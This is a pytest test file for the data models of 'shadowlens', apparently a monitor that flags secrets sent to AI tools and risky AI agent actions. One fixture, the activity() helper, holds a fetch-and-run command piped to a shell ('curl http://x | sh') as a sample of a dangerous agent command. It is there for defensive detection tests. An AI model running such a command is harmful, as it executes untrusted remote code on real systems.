import json

import pytest
from pydantic import ValidationError

from shadowlens import models as m
from shadowlens.models import (
    AgentActivity,
    Alert,
    Band,
    Capabilities,
    Finding,
    Remediation,
    Tool,
    band_for_score,
    new_id,
)

TS = "2026-10-31T10:00:00.000Z"


def make_finding(**overrides):
    base = dict(
        id=new_id(), event_id=new_id(), tool_id="python3|openai", rule_id="SEC_OPENAI_KEY",
        category="secret", severity="high", confidence=0.9, masked_preview="sk-p... (len 51)",
        location={"field": "body"}, meta={"hash12": "0123456789ab"}, created_at=TS,
    )
    base.update(overrides)
    return Finding(**base)


def make_remediation(**overrides):
    base = dict(
        id=new_id(), alert_id=new_id(), summary="Rotate the key.", steps=["Revoke it", "Create a new one"],
        sensitivity="high", verdict="true_positive", data_classes=["credential"], source="template",
        model=None, latency_ms=None, redaction_check="not_applicable", prompt_text=None, created_at=TS,
    )
    base.update(overrides)
    return Remediation(**base)


def make_alert(**overrides):
    f = overrides.pop("finding", None) or make_finding()
    base = dict(
        id=new_id(), finding_id=f.id, tool_id=f.tool_id, provider_id="openai", rule_id=f.rule_id,
        severity="high", title="OpenAI-style API key sent to an AI tool", created_at=TS, finding=f,
    )
    base.update(overrides)
    return Alert(**base)


def make_tool(**overrides):
    base = dict(
        tool_id="python3|openai", process="python3", provider_id="openai", display_name="OpenAI",
        category="cloud_llm", sanctioned=False, confidence="high", event_count=3, bytes_out=None,
        first_seen=TS, last_seen="2026-10-31T10:05:00.000Z", risk=51, risk_band="high", unconfirmed=False,
    )
    base.update(overrides)
    return Tool(**base)


# ---- band_for_score ----------------------------------------------------------

@pytest.mark.parametrize("score,band", [
    (0, Band.LOW), (24, Band.LOW), (25, Band.MODERATE), (49, Band.MODERATE),
    (50, Band.HIGH), (74, Band.HIGH), (75, Band.CRITICAL), (100, Band.CRITICAL),
])
def test_band_boundaries(score, band):
    assert band_for_score(score) is band


@pytest.mark.parametrize("score", [-1, 101])
def test_band_out_of_range(score):
    with pytest.raises(ValueError):
        band_for_score(score)


# ---- Remediation -------------------------------------------------------------

def test_remediation_json_names():
    data = json.loads(make_remediation().model_dump_json())
    assert set(data) == {"id", "alert_id", "summary", "steps", "sensitivity", "verdict", "data_classes",
                         "source", "model", "latency_ms", "redaction_check", "prompt_text", "created_at"}


def test_remediation_limits():
    with pytest.raises(ValidationError):
        make_remediation(summary="x" * 301)
    with pytest.raises(ValidationError):
        make_remediation(steps=["a"] * 6)
    with pytest.raises(ValidationError):
        make_remediation(steps=["x" * 201])
    assert make_remediation(summary="x" * 300, steps=["x" * 200] * 5)


def test_valid_llm_remediation():
    r = make_remediation(source="llm", model="some-model", latency_ms=820, redaction_check="passed",
                         prompt_text="Explain [REDACTED:SEC_OPENAI_KEY:0123456789ab]")
    assert r.source.value == "llm"


def test_llm_remediation_must_have_passed_the_guard():
    for check in ("blocked", "not_applicable"):
        with pytest.raises(ValidationError):
            make_remediation(source="llm", model="m", redaction_check=check)


def test_template_remediation_has_no_model_or_prompt():
    with pytest.raises(ValidationError):
        make_remediation(model="m")
    with pytest.raises(ValidationError):
        make_remediation(prompt_text="text")


def test_blocked_remediation_must_be_a_template():
    assert make_remediation(redaction_check="blocked").redaction_check.value == "blocked"
    with pytest.raises(ValidationError):
        make_remediation(source="llm", redaction_check="blocked")


@pytest.mark.parametrize("field,value", [
    ("sensitivity", "extreme"), ("verdict", "maybe"), ("source", "human"),
    ("redaction_check", "unknown"), ("latency_ms", -1),
])
def test_remediation_enums_checked(field, value):
    with pytest.raises(ValidationError):
        make_remediation(**{field: value})


# ---- Alert -------------------------------------------------------------------

def test_alert_defaults_to_open_without_remediation():
    a = make_alert()
    assert a.status.value == "open" and a.acked_at is None and a.remediation is None


def test_alert_json_names_and_round_trip():
    alert = make_alert()
    data = json.loads(alert.model_dump_json())
    assert set(data) == {"id", "finding_id", "tool_id", "provider_id", "rule_id", "severity", "title",
                         "status", "created_at", "acked_at", "finding", "remediation"}
    assert Alert.model_validate_json(alert.model_dump_json()) == alert


def test_alert_must_match_its_finding():
    f = make_finding()
    with pytest.raises(ValidationError):
        make_alert(finding=f, finding_id=new_id())
    with pytest.raises(ValidationError):
        make_alert(finding=f, tool_id="curl|openai")
    with pytest.raises(ValidationError):
        make_alert(finding=f, rule_id="SEC_JWT")


def test_ack_state_is_consistent():
    assert make_alert(status="acked", acked_at=TS).status.value == "acked"
    with pytest.raises(ValidationError):
        make_alert(status="acked")                 # acked but no time
    with pytest.raises(ValidationError):
        make_alert(status="open", acked_at=TS)     # open but has an ack time


def test_acknowledge_returns_an_acked_copy_and_is_idempotent():
    a = make_alert()
    acked = a.acknowledge("2026-10-31T10:30:00.000Z")
    assert a.status.value == "open"                      # original untouched
    assert acked.status.value == "acked" and acked.acked_at == "2026-10-31T10:30:00.000Z"
    assert acked.finding == a.finding
    assert acked.acknowledge("2030-01-01T00:00:00.000Z") is acked   # second ack changes nothing
    assert make_alert().acknowledge().acked_at.endswith("Z")         # default time is now


def test_status_and_acked_at_cannot_be_set_separately():
    a = make_alert()
    with pytest.raises(ValidationError):
        a.status = "acked"


def test_alert_remediation_must_belong_to_it():
    f = make_finding()
    alert_id = new_id()
    ok = make_alert(finding=f, id=alert_id, remediation=make_remediation(alert_id=alert_id))
    assert ok.remediation.alert_id == alert_id
    with pytest.raises(ValidationError):
        make_alert(finding=f, id=alert_id, remediation=make_remediation(alert_id=new_id()))


def test_alert_title_required():
    with pytest.raises(ValidationError):
        make_alert(title="")


# ---- Capabilities ------------------------------------------------------------

def test_capabilities_default_to_nothing_granted_or_used():
    c = Capabilities()
    for name in ("shell", "fs_read", "fs_write", "network", "mcp", "sensitive_file"):
        cap = getattr(c, name)
        assert (cap.granted, cap.used, cap.risky) == (False, False, False)


def test_capabilities_json_names():
    assert set(json.loads(Capabilities().model_dump_json())) == {
        "shell", "fs_read", "fs_write", "network", "mcp", "sensitive_file"}


def test_capability_unknown_field_rejected():
    with pytest.raises(ValidationError):
        Capabilities(telepathy={"granted": True})


# ---- AgentActivity -----------------------------------------------------------

def activity(**overrides):
    base = dict(ts=TS, capability="shell", kind="used", risky=True, name="bash",
                rule_id="AGENT_DANGEROUS_CMD", finding_id=new_id(), argument="curl http://x | sh")
    base.update(overrides)
    return AgentActivity(**base)


def test_activity_ok_and_names():
    assert set(json.loads(activity().model_dump_json())) == {
        "ts", "capability", "kind", "risky", "name", "rule_id", "finding_id", "argument"}


def test_activity_optional_fields():
    a = activity(rule_id=None, finding_id=None, argument=None, risky=False, kind="granted")
    assert a.rule_id is None and a.argument is None


@pytest.mark.parametrize("field,value", [
    ("capability", "telepathy"), ("kind", "tried"), ("rule_id", "AGENT_MADE_UP"), ("argument", "x" * 201),
])
def test_activity_rejects_bad_values(field, value):
    with pytest.raises(ValidationError):
        activity(**{field: value})


# ---- Tool --------------------------------------------------------------------

def test_tool_ok_and_names():
    data = json.loads(make_tool().model_dump_json())
    assert set(data) == {"tool_id", "process", "provider_id", "display_name", "category", "sanctioned",
                         "confidence", "event_count", "bytes_out", "first_seen", "last_seen", "risk",
                         "risk_band", "finding_counts", "capabilities", "visibility", "unconfirmed"}
    assert set(data["finding_counts"]) == {"critical", "high", "medium", "low", "info"}
    assert set(data["visibility"]) == {"full", "metadata_only"}


def test_tool_id_must_match_process_and_provider():
    with pytest.raises(ValidationError):
        make_tool(tool_id="curl|openai")
    assert make_tool(tool_id="unknown|openai", process="unknown").process == "unknown"


@pytest.mark.parametrize("risk,band", [(24, "high"), (25, "low"), (74, "critical"), (75, "high")])
def test_tool_band_must_match_risk(risk, band):
    with pytest.raises(ValidationError):
        make_tool(risk=risk, risk_band=band)


@pytest.mark.parametrize("risk", [-1, 101])
def test_tool_risk_range(risk):
    with pytest.raises(ValidationError):
        make_tool(risk=risk)


def test_unconfirmed_matches_low_confidence():
    assert make_tool(confidence="low", unconfirmed=True).unconfirmed is True
    with pytest.raises(ValidationError):
        make_tool(confidence="low", unconfirmed=False)
    with pytest.raises(ValidationError):
        make_tool(confidence="high", unconfirmed=True)


def test_first_seen_cannot_be_after_last_seen():
    with pytest.raises(ValidationError):
        make_tool(first_seen="2026-10-31T11:00:00.000Z", last_seen="2026-10-31T10:00:00.000Z")


def test_tool_counts_cannot_be_negative():
    with pytest.raises(ValidationError):
        make_tool(event_count=-1)
    with pytest.raises(ValidationError):
        make_tool(finding_counts={"critical": -1})
